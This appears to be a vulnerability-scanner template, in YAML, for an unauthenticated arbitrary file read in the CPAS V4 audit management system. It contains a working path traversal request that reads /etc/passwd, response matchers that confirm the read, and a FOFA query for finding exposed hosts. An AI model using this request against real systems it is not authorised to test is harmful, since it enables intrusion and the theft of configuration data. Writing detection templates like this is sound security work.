http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - 'root:'
            - /bin/bash
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /cpasm4/plugInManController/downPlugs?fileId=../../../../etc/passwd&fileName=1.txt HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
          Accept: */*
          Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
          Accept-Encoding: gzip, deflate, br
          Connection: keep-alive
id: youshuju-CPASV4-downPlugs-File-reading
info:
    author: Superhero
    description: |-
        fofa: body="/cpasm4/static/cap/font/iconfont.css"
        友数聚 CPAS审计管理系统V4 downPlugs 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
    name: 友数聚 CPAS审计管理系统V4 downPlugs 任意文件读取漏洞
    reference:
        - https://mp.weixin.qq.com/s/AiQhIIcVSUTVNECSSq62dA?token=668829287&lang=zh_CN
    severity: high
    tags:
        - File reading
